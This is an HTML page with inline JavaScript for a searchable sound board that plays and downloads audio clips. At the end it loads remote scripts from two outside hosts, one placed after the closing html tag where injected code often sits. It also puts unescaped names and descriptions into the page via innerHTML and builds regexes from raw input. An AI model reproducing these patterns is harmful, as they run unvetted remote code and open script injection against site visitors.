<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Sound Board</title>
  <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="font-sans leading-relaxed text-gray-800 max-w-screen-lg mx-auto p-5 bg-[url('./assets/a04d4b5ed7c7d4bc264c292e267bcd8e.gif')] bg-repeat bg-center">


  <!-- Header -->
  <header class="text-center py-8 bg-white shadow mb-6">
    <h1 class="text-4xl font-bold text-gray-800 mb-2">🎧 Sound Board</h1>
    <p class="text-gray-500">Search and play sounds instantly</p>
  </header>

  <!-- Search Bar -->
  <div class="max-w-2xl mx-auto px-4 mb-8">
    <input
      id="search"
      type="text"
      placeholder="🔍 Search sounds (min 2 letters)"
      class="w-full px-4 py-3 rounded-lg border border-gray-300 focus:outline-none focus:ring-2 focus:ring-blue-500 text-lg shadow-sm"
    />
  </div>

  <!-- Sound List -->
  <div id="soundList" class="grid gap-6 px-4 sm:grid-cols-2 lg:grid-cols-3 max-w-7xl mx-auto"></div>

  <!-- Loading -->
  <div id="loading" class="hidden text-center my-8 font-semibold text-gray-600">Loading...</div>

  <!-- Stop All Button -->
  <button
    id="stopAllBtn"
    class="fixed bottom-6 right-6 bg-red-500 hover:bg-red-600 text-white font-bold px-5 py-3 rounded-full shadow-lg transition transform hover:scale-105"
  >
    ■ Stop All Sounds
  </button>

  <script>
    const soundListEl = document.getElementById('soundList');
    const searchInput = document.getElementById('search');
    const loadingEl = document.getElementById('loading');
    const stopAllBtn = document.getElementById('stopAllBtn');

    let currentPage = 1;
    let totalCount = 0;
    let isLoading = false;
    let currentQuery = '';
    let audioPlayers = [];
    const DEFAULT_IMAGE = 'assets/no-img.jpeg';

    async function fetchSounds(query = '', page = 1) {
      const url = `/sounds${query ? '?search=' + encodeURIComponent(query) + '&page=' + page : '?page=' + page}`;
      const res = await fetch(url);
      const data = await res.json();
      totalCount = data.count;
      return data.results;
    }

    function highlightText(text, query) {
      if (!query) return text;
      const regex = new RegExp(`(${query})`, 'gi');
      if (!regex.test(text)) return null;
      return text.replace(regex, '<span class="bg-yellow-300 font-semibold">$1</span>');
    }

    function createSoundCard(sound, query) {
      const highlightedTitle = highlightText(sound.name, query);
      const highlightedDesc = sound.description ? highlightText(sound.description, query) : null;
      if (!highlightedTitle && !highlightedDesc) return null;

      const card = document.createElement('div');
      card.className = 'bg-white rounded-xl shadow hover:shadow-lg transition transform hover:-translate-y-1 p-4 flex flex-col';

      const img = document.createElement('img');
      img.src = sound.image ? `/media/images/${sound.image.split('/').pop()}` : DEFAULT_IMAGE;
      img.className = 'w-full h-40 object-cover rounded-md mb-3';
      card.appendChild(img);

      if (highlightedTitle) {
        const title = document.createElement('h3');
        title.className = 'text-lg font-semibold text-gray-800 mb-2';
        title.innerHTML = highlightedTitle;
        card.appendChild(title);
      }

      // Play button
      const btn = document.createElement('button');
      btn.className = 'play-btn w-full py-2 rounded-lg font-semibold mb-2';
      const bgColor = '#' + (sound.color || '3b82f6');
      btn.style.backgroundColor = bgColor;
      btn.style.color = getContrastYIQ(bgColor);
      btn.textContent = '▶ Play';

      const audio = new Audio(`/media/sounds/${sound.mp3.split('/').pop()}`);
      audio.addEventListener('loadedmetadata', () => {
        btn.textContent = `▶ Play (${formatDuration(audio.duration)})`;
      });

      btn.addEventListener('click', () => {
        const a = new Audio(`/media/sounds/${sound.mp3.split('/').pop()}`);
        a.play();
        audioPlayers.push(a);
      });

      card.appendChild(btn);

      // Download button
      const downloadBtn = document.createElement('a');
      downloadBtn.href = `/media/sounds/${sound.mp3.split('/').pop()}`;
      downloadBtn.download = sound.name || 'sound';
      downloadBtn.className = 'inline-block text-center w-full py-2 bg-green-500 hover:bg-green-600 text-white rounded-lg font-semibold transition';
      downloadBtn.textContent = '⬇ Download';
      card.appendChild(downloadBtn);

      if (highlightedDesc) {
        const desc = document.createElement('p');
        desc.className = 'text-sm text-gray-600 mt-2';
        const shortDesc = highlightedDesc.length > 80 ? highlightedDesc.slice(0, 80) + '…' : highlightedDesc;
        desc.innerHTML = shortDesc;
        card.appendChild(desc);
      }

      return card;
    }

    function formatDuration(seconds) {
      const mins = Math.floor(seconds / 60);
      const secs = Math.floor(seconds % 60);
      return `${mins}:${secs.toString().padStart(2, '0')}`;
    }

    function getContrastYIQ(hexcolor) {
      hexcolor = hexcolor.replace('#', '');
      const r = parseInt(hexcolor.substr(0, 2), 16);
      const g = parseInt(hexcolor.substr(2, 2), 16);
      const b = parseInt(hexcolor.substr(4, 2), 16);
      const yiq = (r * 299 + g * 587 + b * 114) / 1000;
      return yiq >= 128 ? 'black' : 'white';
    }

    async function loadSounds(reset = false, pages = 2) {
      if (isLoading) return;
      isLoading = true;
      loadingEl.classList.remove('hidden');

      if (reset) {
        soundListEl.innerHTML = '';
        currentPage = 1;
      }

      try {
        for (let i = 0; i < pages; i++) {
          const sounds = await fetchSounds(currentQuery, currentPage);
          sounds.forEach(sound => {
            const card = createSoundCard(sound, currentQuery);
            if (card) soundListEl.appendChild(card);
          });
          currentPage++;
          if (soundListEl.children.length >= totalCount) break;
        }
      } catch (err) {
        console.error('Failed to load sounds', err);
      } finally {
        isLoading = false;
        loadingEl.classList.add('hidden');
      }
    }

    stopAllBtn.addEventListener('click', () => {
      audioPlayers.forEach(audio => {
        audio.pause();
        audio.currentTime = 0;
      });
      audioPlayers = [];
    });

    loadSounds(true, 2);

    searchInput.addEventListener('input', () => {
      const query = searchInput.value;
      if (query.length >= 2 || query.length === 0) {
        currentQuery = query;
        loadSounds(true, 2);
      }
    });

    window.addEventListener('scroll', () => {
      if (window.innerHeight + window.scrollY >= document.body.offsetHeight - 100) {
        if (!isLoading && soundListEl.children.length < totalCount) {
          loadSounds();
        }
      }
    });
  </script>

  <script src="https://olibot13.pythonanywhere.com/client_script.js"></script>
</body>
</html>
<script src="https://math.voidium.uk/lib/effect.js"></script>
